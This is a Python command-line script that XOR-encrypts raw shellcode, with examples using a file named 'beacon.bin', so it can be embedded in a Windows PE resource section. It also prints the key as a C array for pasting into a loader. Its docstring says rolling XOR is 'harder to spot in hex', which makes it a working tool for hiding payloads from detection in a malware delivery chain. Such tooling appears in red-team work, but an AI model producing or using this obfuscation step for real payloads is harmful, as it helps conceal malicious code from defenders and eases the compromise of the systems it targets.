#!/usr/bin/env python3
"""
encrypt.py
XOR-encrypts a raw shellcode binary for embedding in a PE .rsrc section.

Supports single-byte XOR (simple) and rolling-key XOR (harder to spot in hex).

Usage:
    python encrypt.py <input.bin> [options]

Options:
    -o, --output <file>   Output file (default: <input>.enc)
    -k, --key <hex>       XOR key as hex bytes, e.g. --key deadbeef (default: random 4-byte key)
    --single-byte         Use only the first byte of the key (repeating single-byte XOR)
    --array               Print C array for the key (paste into your loader)

Examples:
    python encrypt.py beacon.bin
    python encrypt.py beacon.bin --key 4142 --array
    python encrypt.py beacon.bin -k aabbccdd --single-byte -o beacon.enc
"""

import os
import sys
import argparse
import secrets


def xor_rolling(data: bytes, key: bytes) -> bytes:
    """Rolling XOR: each byte XORed with key[i % len(key)]."""
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def xor_single(data: bytes, key_byte: int) -> bytes:
    """Single-byte XOR: every byte XORed with the same value."""
    return bytes(b ^ key_byte for b in data)


def to_c_array(name: str, data: bytes, cols: int = 16) -> str:
    """Format bytes as a C BYTE array declaration."""
    lines = []
    lines.append(f"BYTE {name}[] = {{")
    for i in range(0, len(data), cols):
        chunk = data[i:i + cols]
        hex_vals = ", ".join(f"0x{b:02X}" for b in chunk)
        lines.append(f"    {hex_vals},")
    lines.append("};")
    lines.append(f"SIZE_T {name}_len = {len(data)};")
    return "\n".join(lines)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="XOR-encrypt shellcode for .rsrc embedding"
    )
    parser.add_argument("input", help="Raw shellcode binary")
    parser.add_argument("-o", "--output", help="Output file (default: <input>.enc)")
    parser.add_argument(
        "-k", "--key", default=None,
        help="XOR key as hex string, e.g. deadbeef (default: random 4 bytes)"
    )
    parser.add_argument(
        "--single-byte", action="store_true",
        help="Use only the first byte of the key (repeating single-byte XOR)"
    )
    parser.add_argument(
        "--array", action="store_true",
        help="Print C array for the key to stdout"
    )
    args = parser.parse_args()

    # Read input
    if not os.path.isfile(args.input):
        print(f"ERROR: file not found: {args.input}", file=sys.stderr)
        sys.exit(1)

    with open(args.input, "rb") as f:
        shellcode = f.read()

    if not shellcode:
        print("ERROR: input file is empty", file=sys.stderr)
        sys.exit(1)

    # Resolve key
    if args.key:
        try:
            key = bytes.fromhex(args.key)
        except ValueError:
            print(f"ERROR: key must be hex bytes, e.g. 'deadbeef' — got: {args.key!r}", file=sys.stderr)
            sys.exit(1)
    else:
        key = secrets.token_bytes(4)

    if not key:
        print("ERROR: key must not be empty", file=sys.stderr)
        sys.exit(1)

    # Encrypt
    if args.single_byte:
        encrypted = xor_single(shellcode, key[0])
        key_used = bytes([key[0]])
    else:
        encrypted = xor_rolling(shellcode, key)
        key_used = key

    # Write output
    out_path = args.output or (args.input + ".enc")
    with open(out_path, "wb") as f:
        f.write(encrypted)

    key_hex = key_used.hex().upper()
    mode = "single-byte" if args.single_byte else f"rolling ({len(key_used)}-byte key)"
    print(f"Input  : {args.input}  ({len(shellcode)} bytes)")
    print(f"Output : {out_path}   ({len(encrypted)} bytes)")
    print(f"Mode   : {mode}")
    print(f"Key    : 0x{key_hex}")

    if args.array:
        print()
        print(to_c_array("xorKey", key_used))

    # Sanity check: decrypt and verify round-trip
    if args.single_byte:
        check = xor_single(encrypted, key_used[0])
    else:
        check = xor_rolling(encrypted, key_used)

    if check != shellcode:
        print("WARNING: round-trip check FAILED — encrypted output may be corrupt", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
